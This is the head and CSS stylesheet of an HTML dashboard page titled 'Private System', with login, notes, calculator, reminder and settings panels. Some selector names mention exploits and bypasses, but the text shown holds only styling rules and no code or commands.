<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global Styles */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
        margin: 0;
        padding: 0;
        background-color: var(--main-bg, #0d0d0d); /* Use CSS variable for main background */
        color: var(--main-text-color, #e0e0e0); /* Use CSS variable for main text color */
        transition: background-color 0.4s, color 0.4s;
        font-size: 16px;
        line-height: 1.6;
        overflow-x: hidden;
    }

    body.light-theme {
        --main-bg: #f0f0f0;
        --main-text-color: #333;
        --box-bg-light: #fcfcfc;
        --item-bg-alt-light: #eee;
        --panel-bg-light: #fcfcfc;
        --heading-color-light: #994d00;
        --box-shadow-accent-light: rgba(255, 145, 77, 0.6);
        --accent-color: var(--accent-color-light, #994d00); /* Use lighter accent color for light theme if defined */
    }
    
    :root {
        --accent-color: #ff914d;
        --accent-color-light: #994d00; /* Define a lighter version for the light theme specifically for custom components */
        --main-bg: #0d0d0d;
        --main-text-color: #e0e0e0;
        --box-bg-dark: #2a2a2a;
        --item-bg-alt-dark: #3b3b3b;
        --panel-bg-dark: #2a2a2a;
        --heading-color-dark: #ffbf80;

        /* Dynamically set these based on custom color picker or default accent */
        --header-start-color: #ff914d;
        --header-end-color: #ffcc80;
    }


    /* Loading Screen Styles */
    .loading-screen {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: #000;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        font-family: 'Courier New', monospace;
        font-size: 2em;
        color: var(--accent-color); /* Use accent color */
        z-index: 9999;
        transition: opacity 0.5s ease-out;
        opacity: 1;
        text-shadow: 0 0 10px rgba(255, 145, 77, 0.5);
    }

    .loading-screen.fade-out {
        opacity: 0;
        visibility: hidden;
    }

    .loading-screen span {
        display: inline-block;
        overflow: hidden;
        white-space: nowrap;
        border-right: .15em solid var(--accent-color); /* Blinking cursor with accent color */
        animation: typing 2s steps(20, end) forwards,
                   blink-caret .75s step-end infinite;
    }

    @keyframes typing {
        from { width: 0 }
        to { width: 100% }
    }

    @keyframes blink-caret {
        from, to { border-color: transparent }
        50% { border-color: var(--accent-color); }
    }


    /* Login System Styles */
    body.login-body {
        background: var(--main-bg, #0d0d0d); /* Use main bg */
        color: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .login-box {
        background: var(--box-bg-dark, #1a1a1a);
        border-radius: 20px;
        border: 3px solid var(--accent-color); /* Accent color border */
        box-shadow: 0 0 20px rgba(255, 145, 77, 0.6); /* More prominent accent shadow */
        width: 380px; /* Slightly wider */
        padding: 35px 30px; /* More padding */
        text-align: center;
        position: relative;
        transition: border-color 0.4s, box-shadow 0.4s, transform 0.3s ease-in-out;
    }

    .login-box:hover {
        transform: translateY(-5px);
        box-shadow: 0 5px 25px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.8));
    }

    .login-box.flashing {
        animation: flashRed 0.4s ease-in-out 2;
    }

    @keyframes flashRed {
        0%, 100% { border-color: #ff4c4c; box-shadow: 0 0 18px #ff4c4c; } /* Brighter red flash */
        50% { border-color: var(--accent-color); box-shadow: 0 0 10px rgba(255, 145, 77, 0.6); }
    }

    .login-box h2 {
        font-size: 1.8em; /* Slightly larger heading */
        margin-bottom: 25px;
        font-family: 'Courier New', monospace;
        color: var(--heading-color-dark, #ffcc80); /* Lighter accent color for title */
        letter-spacing: 1px;
    }

    .login-box input {
        width: 100%;
        padding: 14px; /* More padding */
        margin-bottom: 18px;
        background: #2b2b2b; /* Even darker input background */
        border: 1px solid #444;
        color: #fff;
        border-radius: 10px; /* More rounded */
        font-size: 1.05em;
        transition: border-color 0.3s, box-shadow 0.3s;
    }

    .login-box input:focus {
        border-color: var(--accent-color);
        box-shadow: 0 0 8px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.8));
        outline: none;
    }

    .login-box label {
        display: flex;
        align-items: center;
        font-size: 0.95em;
        margin-bottom: 15px;
        gap: 12px;
        cursor: pointer;
        color: #cccccc;
    }

    #showPassword:checked + span {
        color: #ff4c4c; /* Red highlight for show password */
    }

    .login-box button {
        width: 100%;
        padding: 14px;
        background-color: #ff4c4c; /* Danger red for primary action */
        color: white;
        font-size: 1.1em;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        transition: background-color 0.3s ease-in-out, transform 0.2s;
        font-weight: bold;
        letter-spacing: 0.5px;
    }

    .login-box button:hover {
        background-color: #e03f3f; /* Slightly darker red on hover */
        transform: translateY(-2px);
        box-shadow: 0 5px 15px rgba(255, 76, 76, 0.4);
    }

    .attempt-counter, .error-message {
        margin-top: 15px;
        font-size: 0.9em;
        color: #ff4c4c;
        min-height: 20px; /* Ensure space for messages */
    }

    .popup {
        display: none;
        position: absolute;
        top: 50%;
        left: 50%;
        width: 340px; /* Slightly larger popup */
        padding: 25px;
        transform: translate(-50%, -50%);
        background: var(--box-bg-dark, #1a1a1a);
        border: 3px solid var(--accent-color);
        border-radius: 18px;
        box-shadow: 0 0 25px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.8));
        z-index: 10;
        animation: fadeIn 0.3s ease-out;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translate(-50%, -60%); }
        to { opacity: 1; transform: translate(-50%, -50%); }
    }

    .popup p {
        margin-bottom: 18px;
        color: var(--heading-color-dark, #ffcc80);
        font-weight: bold;
    }

    .popup input {
        margin-bottom: 18px;
        background: #2b2b2b;
    }


    /* Dashboard Styles */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Orbitron:wght@500;700&display=swap'); /* Added Orbitron for a techy feel */

    body.dashboard-body {
        font-family: 'Montserrat', sans-serif;
        background-color: var(--main-bg, #1a1a1a);
        color: var(--main-text-color, #e0e0e0);
        padding: 20px;
        transition: background-color 0.3s, color 0.3s;
        zoom: 1; /* Initial zoom */
    }

    body.dashboard-body.light-theme {
        background-color: var(--main-bg); /* Use dynamically set --main-bg from theme class */
        color: var(--main-text-color);
    }

    .dashboard-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background: linear-gradient(90deg, var(--header-start-color), var(--header-end-color)); /* Gradient header with dynamic colors */
        padding: 18px 30px;
        border-radius: 15px;
        color: #2a2a2a;
        margin-bottom: 25px;
        box-shadow: 0 5px 20px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.4));
        position: sticky;
        top: 20px;
        z-index: 5;
        animation: slideInFromTop 0.8s ease-out;
    }

    @keyframes slideInFromTop {
        0% { transform: translateY(-100px); opacity: 0; }
        100% { transform: translateY(0); opacity: 1; }
    }

    .dashboard-header h1 {
        font-size: 28px;
        font-family: 'Orbitron', sans-serif; /* Techy font for title */
        color: #000;
        text-shadow: 1px 1px 2px rgba(255,255,255,0.3);
    }

    .user-info {
        font-weight: bold;
        font-size: 1.05em;
        color: #333;
    }

    .version-box {
        background: #ffd966;
        padding: 10px 18px;
        border-radius: 10px;
        color: #000;
        font-weight: bold;
        box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }

    .dashboard-buttons-container {
        display: flex;
        flex-wrap: wrap;
        gap: 15px;
        margin-bottom: 20px;
        justify-content: center;
    }

    .dashboard-buttons-container button,
    .dashboard-buttons-container a {
        background-color: var(--accent-color); /* Use accent color */
        border: none;
        padding: 12px 20px;
        border-radius: 10px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
        min-width: 120px;
        white-space: nowrap;
        font-size: 1em;
        text-decoration: none;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }

    .dashboard-buttons-container button:hover,
    .dashboard-buttons-container a:hover {
        background-color: var(--accent-color-light-hover, #ffb67a); /* Slightly lighter for hover */
        transform: translateY(-3px);
        box-shadow: 0 6px 15px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.3));
    }

    #panicBtn {
        background: #ff4c4c !important;
        color: white !important;
    }

    #panicBtn:hover {
        background: #e03f3f !important;
        box-shadow: 0 6px 15px rgba(255, 76, 76, 0.4) !important;
    }

    #themeToggle, #logoutBtn, #settingsBtn { /* Apply specific styles to utility buttons */
        background-color: #4CAF50; /* Green for settings/logout */
        color: white;
    }
    #themeToggle:hover, #logoutBtn:hover, #settingsBtn:hover {
        background-color: #45a049;
    }


    .announcement-bar {
        width: 100%;
        background-color: var(--accent-color);
        color: black;
        font-weight: bold;
        padding: 10px 0;
        overflow: hidden;
        position: relative;
        border-radius: 10px;
        box-sizing: border-box;
        margin-bottom: 20px;
        user-select: none;
        height: 35px; /* Slightly taller */
        line-height: 15px; /* Adjust line height */
        box-shadow: 0 3px 10px rgba(0,0,0,0.15);
    }

    .announcement-bar span {
        display: inline-block;
        white-space: nowrap;
        position: absolute;
        will-change: transform;
        animation: scrollLeft 20s linear infinite; /* Slower scroll */
        padding-left: 100%;
        font-size: 0.95em;
    }

    @keyframes scrollLeft {
        0% {
            transform: translateX(0%);
        }
        100% {
            transform: translateX(-100%);
        }
    }

    body.dashboard-body.light-theme .announcement-bar {
        background-color: #ffd966;
        color: #000;
    }

    .main-row {
        display: flex;
        gap: 20px;
        margin-bottom: 20px;
        flex-wrap: wrap;
    }

    .box {
        background-color: var(--box-bg-dark);
        padding: 25px; /* More padding */
        border-radius: 15px;
        box-shadow: 0 0 18px var(--box-shadow-accent-dark, rgba(255, 145, 77, 0.35)); /* Accent shadow */
        min-height: 130px;
        transition: background-color 0.3s, color 0.3s, transform 0.2s ease-out;
        flex: 1 1 320px; /* Adjust flex basis */
        position: relative;
        overflow: hidden;
    }

    .box:hover {
        transform: translateY(-5px);
        box-shadow: 0 5px 22px var(--box-shadow-accent-dark-hover, rgba(255, 145, 77, 0.5));
    }

    body.dashboard-body.light-theme .box {
        background-color: var(--box-bg-light);
        color: var(--main-text-color);
        box-shadow: 0 0 18px var(--box-shadow-accent-light);
    }

    .box h2 {
        font-size: 20px; /* Slightly larger h2 */
        margin-bottom: 12px;
        color: var(--heading-color-dark);
        border-bottom: 2px solid rgba(255, 145, 77, 0.5); /* Underline effect */
        padding-bottom: 8px;
        display: flex;
        align-items: center;
        gap: 10px;
    }

    body.dashboard-body.light-theme .box h2 {
        color: var(--heading-color-light);
        border-bottom-color: rgba(153, 77, 0, 0.4);
    }

    .box p, .box ul {
        font-size: 15px;
    }

    .update-entry, .reminder-item, .task-item {
        background: #3c251d; /* Slightly different background for list items */
        padding: 10px;
        margin-top: 8px;
        border-radius: 8px;
        color: #ffdbbf;
        transition: background-color 0.3s ease;
        display: flex;
        justify-content: space-between;
        align-items: center;
        gap: 10px;
    }

    .update-entry:hover, .reminder-item:hover, .task-item:hover {
        background-color: #5a3c2f;
    }

    body.dashboard-body.light-theme .update-entry,
    body.dashboard-body.light-theme .reminder-item,
    body.dashboard-body.light-theme .task-item {
        background: #ffe3b3;
        color: #7d3d00;
    }

    .calendar {
        display: grid;
        grid-template-columns: repeat(7, 1fr);
        gap: 6px; /* Slightly larger gap */
        margin-top: 15px;
        text-align: center;
        font-size: 13px;
    }

    .calendar div {
        padding: 7px;
        background: #3f3f3f;
        border-radius: 5px;
        transition: background 0.2s ease, transform 0.1s ease;
    }
    .calendar div:hover:not(.today) {
        transform: translateY(-2px);
        background: #5a5a5a;
    }

    .today {
        background: var(--accent-color) !important;
        font-weight: bold;
        color: black;
        box-shadow: 0 0 10px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.7));
    }

    body.dashboard-body.light-theme .calendar div {
        background: #ffd966;
        color: #000;
    }

    body.dashboard-body.light-theme .today {
        background: var(--accent-color-light) !important;
        color: #ffd966;

    }

    #canvasContainer {
        display: none;
        margin-top: 20px;
        text-align: center;
        padding: 25px;
        background: var(--box-bg-dark);
        border-radius: 15px;
        box-shadow: 0 0 18px var(--box-shadow-accent-dark, rgba(255, 145, 77, 0.35));
    }
    body.dashboard-body.light-theme #canvasContainer {
        background-color: var(--box-bg-light);
    }

    #notesCanvas {
        border: 2px solid var(--accent-color);
        border-radius: 12px;
        background: #fff;
        cursor: crosshair;
        touch-action: none;
        box-shadow: 0 0 15px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.2));
    }

    #canvasControls {
        margin-top: 15px;
        display: flex;
        justify-content: center;
        gap: 10px;
    }

    #canvasControls button {
        background-color: var(--accent-color);
        border: none;
        padding: 10px 18px;
        border-radius: 8px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
        margin: 0 5px;
    }

    #canvasControls button:hover {
        background-color: var(--accent-color-light-hover, #ffb67a);
        transform: translateY(-2px);
    }

    .motivation-box {
        background-color: #333;
        color: #ffd966;
        padding: 25px;
        border-radius: 15px;
        font-style: italic;
        font-size: 17px;
        box-shadow: 0 0 15px var(--box-shadow-accent-dark-hover, rgba(255, 145, 77, 0.5));
        display: flex;
        align-items: center;
        justify-content: center;
        min-height: 130px;
        text-align: center;
        border-left: 5px solid var(--heading-color-dark, #ffcc80);
    }

    body.dashboard-body.light-theme .motivation-box {
        background-color: #fff3cc;
        color: #994d00;
        box-shadow: 0 0 15px var(--box-shadow-accent-light, rgba(255, 145, 77, 0.8));
        border-left-color: var(--heading-color-light, #994d00);
    }

    /* Info Panel Styles */
    .info-panel {
        display: none;
        background-color: var(--panel-bg-dark);
        padding: 30px;
        border-radius: 15px;
        margin-top: 25px;
        box-shadow: 0 0 20px var(--box-shadow-accent-dark, rgba(255, 145, 77, 0.4));
        animation: fadeInPanel 0.4s ease-out;
    }

    @keyframes fadeInPanel {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    body.dashboard-body.light-theme .info-panel {
        background-color: var(--panel-bg-light);
        color: var(--main-text-color);
    }

    .info-panel h2 {
        color: var(--accent-color);
        margin-bottom: 20px;
        font-size: 22px;
        border-bottom: 2px solid rgba(255, 145, 77, 0.6);
        padding-bottom: 10px;
        display: flex;
        align-items: center;
        gap: 10px;
    }

    body.dashboard-body.light-theme .info-panel h2 {
        color: var(--accent-color-light);
        border-bottom-color: rgba(153, 77, 0, 0.5);
    }

    .wifi-grid, .school-info-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); /* Responsive grid */
        gap: 12px;
        margin-bottom: 15px;
    }
    .wifi-grid div:first-child, .school-info-grid div:first-child {
        font-weight: bold;
        color: var(--heading-color-dark, #ffcc80);
    }
    body.dashboard-body.light-theme .wifi-grid > div:nth-child(-n+8) {
      color: var(--heading-color-light);
    }
    .wifi-grid > div:nth-child(-n+8) {
        font-weight: bold;
        color: var(--heading-color-dark, #ffcc80);
    }

    .wifi-grid div {
        padding: 10px;
        background: #3f3f3f;
        border-radius: 7px;
        text-align: center;
        font-weight: normal; /* Override bold from first child */
        box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
    }

    body.dashboard-body.light-theme .wifi-grid div {
        background: var(--item-bg-alt-light);
    }

    .wifi-entry {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(100px, 1fr)); /* Responsive grid */
        gap: 12px;
        margin-bottom: 10px;
        align-items: center;
    }

    .wifi-entry div {
        padding: 10px;
        background: #4a2b20; /* Distinct background for entries */
        border-radius: 7px;
        text-align: center;
        font-size: 0.95em;
    }

    body.dashboard-body.light-theme .wifi-entry div {
        background: #ffe0cc;
    }

    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* More responsive grids */
        gap: 12px;
        margin-top: 18px;
    }

    .handbook-buttons button, .handbook-buttons a,
    .links-list a,
    .exploit-buttons a,
    .bypass-buttons button {
        background-color: var(--accent-color);
        border: none;
        padding: 14px;
        border-radius: 10px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
        text-decoration: none;
        text-align: center;
        box-shadow: 0 3px 8px rgba(0,0,0,0.15);
    }

    .handbook-buttons button:hover, .handbook-buttons a:hover,
    .links-list a:hover,
    .exploit-buttons a:hover,
    .bypass-buttons button:hover {
        background-color: var(--accent-color-light-hover, #ffb67a);
        transform: translateY(-3px);
        box-shadow: 0 5px 12px var(--accent-color-hover-shadow, rgba(255, 145, 77, 0.3));
    }

    .coming-soon, .info-text {
        background: #3c251d;
        padding: 20px;
        border-radius: 10px;
        margin-top: 18px;
        text-align: center;
        font-weight: bold;
        color: #ffccb3;
        border-left: 4px solid var(--accent-color);
        animation: pulse 1.5s infinite alternate;
    }

    @keyframes pulse {
        0% { transform: scale(1); box-shadow: 0 0 10px rgba(255, 145, 77, 0.4); }
        100% { transform: scale(1.02); box-shadow: 0 0 15px rgba(255, 145, 77, 0.7); }
    }

    body.dashboard-body.light-theme .coming-soon,
    body.dashboard-body.light-theme .info-text {
        background: #ffd999;
        color: #7d3d00;
        border-left-color: var(--accent-color-light);
    }

    .info-text p {
        white-space: pre-wrap; /* Preserve formatting for shortcuts */
        text-align: left;
        line-height: 1.8;
    }

    .school-info-item {
        background: #4a2b20;
        padding: 15px;
        border-radius: 8px;
    }

    body.dashboard-body.light-theme .school-info-item {
        background: #ffe0cc;
    }

    .school-info-label {
        font-weight: bold;
        color: var(--accent-color);
        margin-bottom: 6px;
        font-size: 0.9em;
    }

    body.dashboard-body.light-theme .school-info-label {
        color: var(--accent-color-light);
    }

    .ipad-options {
        display: flex;
        gap: 12px;
        margin-top: 18px;
    }

    .ipad-options button {
        flex: 1;
        background-color: var(--accent-color);
        border: none;
        padding: 14px;
        border-radius: 10px;
        color: black;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s;
    }

    .ipad-options button:hover {
        background-color: var(--accent-color-light-hover, #ffb67a);
    }

    .ipad-content, .bypass-content {
        display: none;
        background: #3c251d;
        padding: 20px;
        border-radius: 10px;
        margin-top: 18px;
        color: #ffccb3;
    }

    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
        background: #ffd999;
        color: #7d3d00;
    }

    /* Notification System */
    .notification-container {
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        z-index: 999;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 10px;
    }

    .notification {
        background-color: rgba(50, 50, 50, 0.9); /* Dark semi-transparent background */
        color: white;
        padding: 12px 20px;
        border-radius: 10px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        opacity: 0;
        transform: translateY(20px);
        animation: slideInFade 0.5s forwards, fadeOut 0.5s 2.5s forwards;
        font-size: 0.9em;
        min-width: 250px;
        text-align: center;
        border-left: 5px solid var(--accent-color);
    }
    body.dashboard-body.light-theme .notification {
        background-color: rgba(250, 250, 250, 0.9);
        color: #333;
        border-left-color: var(--accent-color-light);
    }

    @keyframes slideInFade {
        to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeOut {
        from { opacity: 1; transform: translateY(0); }
        to { opacity: 0; transform: translateY(-20px); }
    }

    /* Reminder Panel Specific Styles */
    .reminder-form {
        display: flex;
        flex-wrap: wrap;
        gap: 10px;
        margin-bottom: 20px;
        align-items: flex-end;
    }

    .reminder-form input, .reminder-form button {
        padding: 10px;
        border-radius: 8px;
        border: 1px solid #444;
        background-color: #3b3b3b;
        color: #e0e0e0;
        font-size: 1em;
    }
    body.dashboard-body.light-theme .reminder-form input,
    body.dashboard-body.light-theme .reminder-form button {
        background-color: #fff;
        border-color: #bbb;
        color: #333;
    }

    .reminder-form input[type="text"] {
        flex: 1 1 180px;
    }
    .reminder-form input[type="date"],
    .reminder-form input[type="time"] {
        flex: 1 1 120px;
    }
    .reminder-form button {
        background-color: #28a745;
        color: white;
        cursor: pointer;
        transition: background-color 0.3s;
        flex-grow: 0;
        min-width: 100px;
    }
    .reminder-form button:hover {
        background-color: #218838;
    }

    .reminder-list-container {
        max-height: 400px;
        overflow-y: auto;
        padding-right: 10px;
    }

    .reminder-item {
        padding: 12px 15px;
        margin-bottom: 8px;
        background: #4a2b20;
        border-radius: 8px;
        font-size: 0.95em;
    }
    .reminder-item.completed {
        text-decoration: line-through;
        opacity: 0.7;
        background-color: #2b2b2b;
    }
    body.dashboard-body.light-theme .reminder-item.completed {
        background-color: #f0f0f0;
    }

    .reminder-item button {
        background: #dc3545;
        color: white;
        border: none;
        padding: 6px 10px;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s;
    }
    .reminder-item button:hover {
        background-color: #c82333;
    }
    .reminder-item .complete-btn {
        background-color: #007bff;
        margin-right: 5px;
    }
    .reminder-item .complete-btn:hover {
        background-color: #0056b3;
    }


    /* Settings Panel Styles */
    .settings-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
        gap: 20px;
        margin-top: 20px;
    }

    .setting-group {
        background: #3c251d;
        padding: 20px;
        border-radius: 10px;
        border-left: 4px solid var(--accent-color);
    }
    body.dashboard-body.light-theme .setting-group {
        background: #ffd999;
        border-left-color: var(--accent-color-light);
    }

    .setting-group h3 {
        color: var(--heading-color-dark, #ffbf80);
        margin-bottom: 15px;
        border-bottom: 1px dashed rgba(255, 145, 77, 0.4);
        padding-bottom: 8px;
        font-size: 1.1em;
    }
    body.dashboard-body.light-theme .setting-group h3 {
        color: var(--heading-color-light);
        border-bottom-color: rgba(153, 77, 0, 0.3);
    }

    .setting-item {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 10px;
        padding: 5px 0;
        font-size: 0.95em;
    }
    .setting-item label {
        flex: 1;
        margin-right: 15px;
    }

    .setting-item input[type="checkbox"] {
        appearance: none;
        width: 25px;
        height: 15px;
        background-color: #ccc;
        border-radius: 10px;
        position: relative;
        cursor: pointer;
        transition: background-color 0.3s;
    }
    .setting-item input[type="checkbox"]::before {
        content: '';
        position: absolute;
        left: 2px;
        top: 2px;
        width: 11px;
        height: 11px;
        background-color: white;
        border-radius: 50%;
        transition: transform 0.3s;
    }
    .setting-item input[type="checkbox"]:checked {
        background-color: var(--accent-color);
    }
    .setting-item input[type="checkbox"]:checked::before {
        transform: translateX(10px);
    }
    body.dashboard-body.light-theme .setting-item input[type="checkbox"] {
        background-color: #aaa;
    }
    body.dashboard-body.light-theme .setting-item input[type="checkbox"]:checked {
        background-color: var(--accent-color-light);
    }


    .setting-item select, .setting-item input[type="range"] {
        background-color: #3b3b3b;
        color: #e0e0e0;
        border: 1px solid #555;
        padding: 5px 8px;
        border-radius: 5px;
        transition: background-color 0.3s, border-color 0.3s;
    }
    body.dashboard-body.light-theme .setting-item select,
    body.dashboard-body.light-theme .setting-item input[type="range"] {
        background-color: #f8f8f8;
        color: #333;
        border-color: #ccc;
    }

    .setting-item select:focus, .setting-item input:focus {
        outline: none;
        border-color: var(--accent-color);
    }

    .color-picker {
        display: flex;
        gap: 5px;
        align-items: center;
    }
    .color-picker input[type="color"] {
        width: 40px;
        height: 25px;
        padding: 2px;
        border-radius: 5px;
        border: 1px solid #555;
        cursor: pointer;
        background: transparent; /* allow color to show through */
    }

    /* Calculator & Converter */
    .calculator-grid, .converter-grid {
        display: grid;
        grid-template-columns: repeat(4, 1fr);
        gap: 8px;
        width: 300px;
        margin: 20px auto;
        background: #3b3b3b;
        padding: 15px;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0,0,0,0.3);
    }

    .calculator-output {
        grid-column: 1 / -1;
        background-color: #2b2b2b;
        color: white;
        padding: 15px;
        font-size: 1.8em;
        text-align: right;
        border-radius: 8px;
        margin-bottom: 10px;
    }

    .calculator-grid button {
        background-color: #555;
        color: white;
        border: none;
        padding: 15px;
        font-size: 1.2em;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.2s;
    }
    .calculator-grid button:hover {
        background-color: #777;
    }
    .calculator-grid button.operator {
        background-color: var(--accent-color);
        color: black;
    }
    .calculator-grid button.operator:hover {
        background-color: var(--accent-color-light-hover, #ffb67a);
    }
    .calculator-grid button.clear, .calculator-grid button.equals {
        background-color: #4CAF50;
    }
    .calculator-grid button.clear:hover, .calculator-grid button.equals:hover {
        background-color: #45a049;
    }
    .calculator-grid button.equals {
        grid-column: span 2;
    }
    body.dashboard-body.light-theme .calculator-output {
        background-color: #e0e0e0;
        color: #333;
    }
    body.dashboard-body.light-theme .calculator-grid button {
        background-color: #ddd;
        color: #333;
    }
    body.dashboard-body.light-theme .calculator-grid button:hover {
        background-color: #ccc;
    }
    body.dashboard-body.light-theme .calculator-grid button.operator {
        background-color: var(--accent-color-light);
        color: #f9f2dc;
    }
    body.dashboard-body.light-theme .calculator-grid button.operator:hover {
        background-color: #7d3d00;
    }
    body.dashboard-body.light-theme .calculator-grid button.clear, body.dashboard-body.light-theme .calculator-grid button.equals {
        background-color: #218838;
        color: white;
    }
    body.dashboard-body.light-theme .calculator-grid button.clear:hover, body.dashboard-body.light-theme .calculator-grid button.equals:hover {
        background-color: #1b6d2e;
    }

    .converter-input-group {
        display: flex;
        gap: 10px;
        align-items: center;
        margin-bottom: 15px;
    }
    .converter-input-group label {
        flex-basis: 80px;
        text-align: right;
    }
    .converter-input-group input, .converter-input-group select {
        flex-grow: 1;
        padding: 8px;
        border-radius: 5px;
        border: 1px solid #555;
        background-color: #2b2b2b;
        color: white;
    }
    body.dashboard-body.light-theme .converter-input-group input,
    body.dashboard-body.light-theme .converter-input-group select {
        background-color: #f0f0f0;
        color: #333;
        border-color: #ccc;
    }
    .conversion-result {
        margin-top: 15px;
        padding: 10px;
        background: #4a2b20;
        border-radius: 8px;
        font-size: 1.1em;
        text-align: center;
    }
    body.dashboard-body.light-theme .conversion-result {
        background: #ffe0cc;
        color: #7d3d00;
    }

    /* Task List Panel */
    .task-input-group {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
    }
    .task-input-group input {
        flex-grow: 1;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid #444;
        background-color: #3b3b3b;
        color: #e0e0e0;
        font-size: 1em;
    }
    body.dashboard-body.light-theme .task-input-group input {
        background-color: #fff;
        border-color: #bbb;
        color: #333;
    }
    .task-input-group button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 10px 15px;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.3s;
    }
    .task-input-group button:hover {
        background-color: #0056b3;
    }

    .task-item {
        margin-bottom: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }
    .task-item.completed span {
        text-decoration: line-through;
        opacity: 0.7;
    }
    .task-item .task-text {
        flex-grow: 1;
        margin-right: 10px;
    }
    .task-item button {
        background: #dc3545;
        color: white;
        border: none;
        padding: 6px 10px;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s;
        margin-left: 5px;
    }
    .task-item button:hover {
        background-color: #c82333;
    }
    .task-item .toggle-complete {
        background-color: #ffc107;
        color: black;
    }
    .task-item .toggle-complete:hover {
        background-color: #e0a800;
    }

    /* Weather Widget */
    .weather-widget {
        text-align: center;
        margin-top: 15px;
    }
    .weather-widget input {
        width: 80%;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid #555;
        background-color: #3b3b3b;
        color: #e0e0e0;
        font-size: 1em;
        margin-bottom: 10px;
    }
    body.dashboard-body.light-theme .weather-widget input {
        background-color: #fff;
        border-color: #bbb;
        color: #333;
    }
    .weather-widget button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 10px 15px;
        border-radius: 8px;
        cursor: pointer;
        transition: background-color 0.3s;
        margin-left: 5px;
    }
    .weather-widget button:hover {
        background-color: #0056b3;
    }
    .weather-info {
        margin-top: 15px;
        padding: 15px;
        background: #4a2b20;
        border-radius: 10px;
    }
    .weather-info h3 {
        color: var(--heading-color-dark);
        font-size: 1.3em;
        margin-bottom: 10px;
    }
    .weather-info p {
        margin: 5px 0;
    }
    body.dashboard-body.light-theme .weather-info {
        background: #ffe0cc;
        color: #7d3d00;
    }
    body.dashboard-body.light-theme .weather-info h3 {
        color: var(--heading-color-light);
    }

    /* Password Generator */
    .password-generator-output {
        background-color: #2b2b2b;
        padding: 15px;
        border-radius: 8px;
        font-family: 'Courier New', monospace;
        font-size: 1.2em;
        margin-bottom: 15px;
        text-align: center;
        word-break: break-all;
    }
    body.dashboard-body.light-theme .password-generator-output {
        background-color: #e0e0e0;
        color: #333;
    }
    .password-controls label {
        display: block;
        margin-bottom: 8px;
        font-size: 0.95em;
    }
    .password-controls input[type="range"] {
        width: calc(100% - 100px); /* Adjust width to fit label and value */
        vertical-align: middle;
        margin-right: 10px;
    }
    .password-controls span.range-value {
        width: 40px;
        display: inline-block;
        text-align: right;
    }
    .password-controls input[type="checkbox"] {
        margin-right: 8px;
    }
    .password-controls button {
        margin-top: 15px;
        width: 100%;
    }


    /* Icon Styling (Font Awesome replacement) */
    .dashboard-buttons-container button::before,
    .dashboard-buttons-container a::before,
    .box h2::before,
    .info-panel h2::before {
        font-family: 'Segoe UI Symbol', 'Material Icons', sans-serif; /* Using unicode/OS built-in icons */
        margin-right: 8px;
    }

    /* Icons for buttons */
    #sessionTime::before { content: '⏳'; }
    #realTimeClock::before { content: '🕒'; }
    #realDate::before { content: '📅'; }
    #notesBtn::before { content: '📝'; } /* Changed from 📒 */
    #exportNotesBtn::before { content: '💾'; }
    #screenshotBtn::before { content: '📸'; }
    #toggleSectionsBtn::before { content: '↔️'; } /* Changed from arrows */
    #fixIssuesBtn::before { content: '⚙️'; } /* Changed from 🛠️ */
    #fullScreenBtn::before { content: '💻'; } /* Changed from 🖥️ */
    #zoomInBtn::before { content: '➕'; }
    #zoomOutBtn::before { content: '➖'; }
    #restartBtn::before { content: '🔄'; }
    #panicBtn::before { content: '🚨'; }
